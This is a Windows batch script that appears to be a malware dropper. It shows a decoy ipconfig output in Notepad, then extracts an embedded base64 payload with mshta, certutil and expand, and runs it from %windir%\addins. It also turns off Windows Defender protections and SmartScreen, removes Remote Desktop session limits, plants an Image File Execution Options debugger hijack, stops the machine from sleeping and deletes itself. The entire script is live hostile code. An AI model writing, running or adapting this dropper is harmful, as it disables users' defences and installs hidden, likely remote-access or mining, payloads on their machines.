ECHO PROCX_ALL B64
%~d0
cd /D "%~p0"
md %windir%\addins
cd %windir%\addins
ipconfig>>aypi.txt
Reg.exe add "HKCU\Software\Microsoft\Notepad" /v "iPointSize" /t REG_DWORD /d "140" /f
start /min aypi.txt
set "x=%~f0"& set fso=CreateObject("Scripting.FileSystemObject")
>>"Procx.64" mshta "vbscript:%fso%.GetStandardStream(1).Write(Split(%fso%.OpenTextFile("%x: ="+Chr(32)+"%").ReadAll(),vbCrLf+"exit"+Chr(32)+"/b"+Chr(32)+"0"+vbCrLf)(1))&Close()"
certutil.exe -decode Procx.64 Procx.cab
expand Procx.cab -F:*.* %windir%\addins
start ProcX86-64.bat
explorer.exe %windir%\addins
pause
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0x00000000 /f
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v HomePage /t REG_DWORD /d 0x00000001 /f
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "about:blank" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0x00000000 /f
reg add "HKLM\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v HomePage /t REG_DWORD /d 0x00000001 /f
reg add "HKLM\Software\Policies\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "about:blank" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "0" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessHacker.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmisrv.exe\PerfOptions" /v CpuPriorityClass /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}" /v "IsInstalled" /t REG_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}" /v "IsInstalled" /t REG_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v "MaxIdleTime" /t REG_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v "MaxConnectionTime" /t REG_DWORD /d "0" /f
echo %date%>>drm.ocx
reg add "HKCU\Control Panel\International" /v sDate /t REG_SZ /d "." /f
reg add "HKCU\Control Panel\International" /v sShortDate /t REG_SZ /d "dd.MM.yyyy" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EOSNotify.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackDocs" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackDocs" /t REG_DWORD /d "0" /f
del /f /q Procx.64
powercfg -x -standby-timeout-dc 0&powercfg -x -standby-timeout-ac 0& powercfg -x -hibernate-timeout-ac 0& powercfg -x -hibernate-timeout-dc 0
del /f /q %windir%\nla.bat
del /f /q %windir%\tspatch.exe
del /f /q %windir%\tspatch.log
del /f /q %windir%\rdpw.exe
del /f /q %windir%\rdpwinst.exe
del /f /q "%0"
exit /b 0